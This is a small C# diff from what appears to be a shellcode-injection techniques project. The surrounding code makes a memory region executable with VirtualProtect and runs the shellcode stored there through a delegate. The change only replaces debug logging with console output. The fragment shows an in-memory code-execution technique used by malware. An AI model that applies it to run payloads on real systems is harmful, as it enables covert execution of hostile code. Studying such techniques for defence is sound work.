@@ -20,10 +20,10 @@ namespace ShellcodeInjectionTechniques
                     // set the memory where the shellcode is to PAGE_EXECUTE_READWRITE
                     IntPtr memoryAddress = (IntPtr)ptr;
                     VirtualProtect(memoryAddress, (UIntPtr)shellcode.Length, MemoryProtection.PAGE_EXECUTE_READWRITE, out MemoryProtection lpfOldProtect);
-                    Debug("[+] VirtualProtect() - set to PAGE_EXECUTE_READWRITE, shellcode address: 0x{0}", new string[] { memoryAddress.ToString("X") });
+                    Console.WriteLine("[+] VirtualProtect() - set to PAGE_EXECUTE_READWRITE, shellcode address: 0x{0}", new string[] { memoryAddress.ToString("X") });
 
                     // execute the shellcode using a delegate function
-                    Debug("[+] Executing shellcode - memory address: 0x{0}", new string[] { memoryAddress.ToString("X") });
+                    Console.WriteLine("[+] Executing shellcode - memory address: 0x{0}", new string[] { memoryAddress.ToString("X") });
                     ShellcodeDelegate func = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(ShellcodeDelegate));
                     func();
                 }
